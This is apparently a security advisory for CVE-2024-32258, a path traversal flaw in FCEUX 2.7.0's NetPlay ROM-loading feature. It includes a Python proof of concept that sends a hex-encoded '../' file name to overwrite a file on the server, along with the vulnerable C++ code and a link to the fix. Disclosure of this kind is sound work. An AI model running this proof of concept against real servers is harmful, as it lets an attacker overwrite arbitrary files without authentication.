| **Describe the bug** After receiving a request from the client to load the ROM, the server will map an ROM file in the temp directory based on the file name sent by the client.  However, the server directly concatenates tmp and rom file names without filtering out special characters, resulting in directory traversal vulnerabilities.  This vulnerability can cause arbitrary file overwrite.  **PoC**  ``` import socket import binascii  client = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM) client.connect(('192.168.17.131', 4046))  header = "aa55aa55aa55aa550000000a00000204000000f0" path = "2e2e2f686f6d652f746f6d2f68656c6c6f0000007300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" nes_content = "You've been hacked\n"  client.send(binascii.unhexlify(header + path) + nes_content.encode() + binascii.unhexlify("00" * 0x100)) res = client.recv(1024) print(res)  packet = "0000000000000000000000000800450000641108400040062b8a7f0000017f000001cd340fcee511e70e3cfc427080180200fe5800000101080a94ee338594ee3382aa55aa55aa55aa5500000028000000300000000100000001000000000000000000000000000000000000000000000000" client.send(binascii.unhexlify(packet)) res = client.recv(1024) print(res) ```  **Screenshots**    fceux.2024-04-06.094239.mp4 |

## Overview

* **CVE ID**: [CVE-2024-32258](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32258)
* **Type**: Path Traversal
* **Vendor**: [FCEUX](https://fceux.com/)
* **Products**: FCEUX\_NetPlay
* **Version**: 2.7.0
* **Fix**: [48b48e7c13be1b949074f42660a33c7ef57135e1](https://github.com/TASEmulators/fceux/pull/728/commits/48b48e7c13be1b949074f42660a33c7ef57135e1)

## Description

FCEUX is a NES Emulator that can take us back to our childhood. It provides multiple interesting features, such as two players being able to play games online.

The server and client can pass ROMs to each other, but the server does not filter out special characters in the ROM names sent by the client. This path traversal vulnerability can cause any file on the server to be overwritten. Even more serious is that the remote loading of ROMs does not require authentication, even if the server settings require a password to log in.

It was introduced during commit [798c5a1d9c73b899cdbe3d613c0022588281979f](https://github.com/TASEmulators/fceux/commit/798c5a1d9c73b899cdbe3d613c0022588281979f) - *For NetPlay, added ability for client to request a ROM to load.*

```
if (acceptRomLoadReq)
{
    FILE *fp;
    std::string filepath = QDir::tempPath().toLocal8Bit().constData();
    const char *romData = &static_cast<const char*>(msgBuf)[ sizeof(netPlayLoadRomReq) ];

    filepath.append( "/" );
    filepath.append( msg->fileName );

    printf("Load ROM Request Received: %s\n", filepath.c_str());

    //printf("Dumping Temp Rom to: %s\n", filepath.c_str());
    fp = ::fopen( filepath.c_str(), "w");

    if (fp == nullptr)
    {
        return;
    }
    ::fwrite( romData, 1, msgSize, fp );
    ::fclose(fp);

    FCEU_WRAPPER_LOCK();
    LoadGame( filepath.c_str(), true, true );
    FCEUI_SetEmulationPaused(EMULATIONPAUSED_PAUSED);
    FCEU_WRAPPER_UNLOCK();

    resyncAllClients();
}
```

Both `msf->fileName` and `fp` are specified by the attacker.
